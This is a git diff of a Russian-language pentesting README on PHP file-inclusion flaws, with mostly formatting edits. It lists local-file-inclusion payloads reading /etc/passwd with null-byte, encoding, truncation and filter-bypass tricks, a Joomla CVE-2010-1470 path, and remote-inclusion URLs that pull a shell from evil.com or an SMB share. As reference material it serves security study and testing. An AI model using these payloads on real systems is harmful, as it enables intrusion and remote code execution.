@@ -12,7 +12,8 @@
 * [URL](#URL)
 
 
-> Уязвимость включения файлов - это тип уязвимости безопасности в веб-приложениях, особенно распространенный в приложениях, разработанных на PHP, где злоумышленник может включить файл, используя недостаточную проверку входных/выходных данных. Эта уязвимость может привести к различным вредоносным действиям, включая выполнение кода, кражу данных и изменение содержимого веб-сайта.
+> Уязвимость включения файлов - это тип уязвимости безопасности в веб-приложениях, особенно распространенный в приложениях, разработанных на PHP, где можно включить файл, используя недостаточную проверку входных/выходных данных.
+>> Эта уязвимость может привести к различным вредоносным действиям, включая выполнение кода, кражу данных и изменение содержимого веб-сайта.
 
 
 # Инструменты
@@ -38,7 +39,7 @@ include($file);
 
 В следующих примерах включаем файл /etc/passwd, проверь главу [Directory & Path Traversal](https://github.com/Kaupervud69/WebVuln/blob/main/Path%20traversal/README.md) для более интересных файлов.
 
-```text
+```
 http://example.com/index.php?page=../../../etc/passwd
 ```
 
@@ -46,30 +47,26 @@ http://example.com/index.php?page=../../../etc/passwd
 
 ⚠️ В версиях PHP ниже 5.3.4 мы можем завершать null байтом (%00).
 
-```text
-
+```
 http://example.com/index.php?page=../../../etc/passwd%00
 ```
 
 **Пример:** Joomla! Component Web TV 1.0 - CVE-2010-1470
 
-```text
-
+```
 {{BaseURL}}/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00
 ```
 
 # Двойное кодирование
 
-```text
-
+```
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
 ```
 
 # UTF-8 кодирование
 
-```text
-
+```
 http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
 http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
 ```
@@ -78,8 +75,7 @@ http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/pas
 
 В большинстве установок PHP имя файла длиннее 4096 байт будет обрезано, поэтому любые лишние символы будут отброшены.
 
-```text
-
+```
 http://example.com/index.php?page=../../../etc/passwd............[ДОБАВЬ БОЛЬШЕ]
 http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ДОБАВЬ БОЛЬШЕ]
 http://example.com/index.php?page=../../../etc/passwd/./././././.[ДОБАВЬ БОЛЬШЕ] 
@@ -88,8 +84,7 @@ http://example.com/index.php?page=../../../[ДОБАВЬ БОЛЬШЕ]../../../.
 
 # Обход фильтров
 
-```text
-
+```
 http://example.com/index.php?page=....//....//etc/passwd
 http://example.com/index.php?page=..///////..////..//////etc/passwd
 http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
@@ -101,29 +96,25 @@ http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C
 
 Удаленное включение файлов больше не работает в конфигурации по умолчанию, поскольку allow_url_include отключен начиная с PHP 5.
 
-```text
-
+```
 allow_url_include = On
 ```
 
 * Большинство методов обхода фильтров из раздела LFI можно повторно использовать для RFI.
 
-```text
-
+```
 http://example.com/index.php?page=http://evil.com/shell.txt
 ```
 
 # Null Byte RFI
 
-```text
-
+```
 http://example.com/index.php?page=http://evil.com/shell.txt%00
 ```
 
 # Двойное кодирование RFI
 
-```text
-
+```
 http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
 ```
 
@@ -131,9 +122,9 @@ http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
 
 * Когда allow_url_include и allow_url_fopen установлены в Off. Все еще возможно включить удаленный файл на Windows машине с использованием протокола smb.
 
-1. Создайте общедоступную общую папку
-2. Напишите PHP код внутри файла: shell.php
-3. Включите его: ```http://example.com/index.php?page=\\10.0.0.1\share\shell.php```
+1. Создай общедоступную общую папку
+2. Напиши PHP код внутри файла: shell.php
+3. Включи его: ```http://example.com/index.php?page=\\10.0.0.1\share\shell.php```
 
 # URL
 
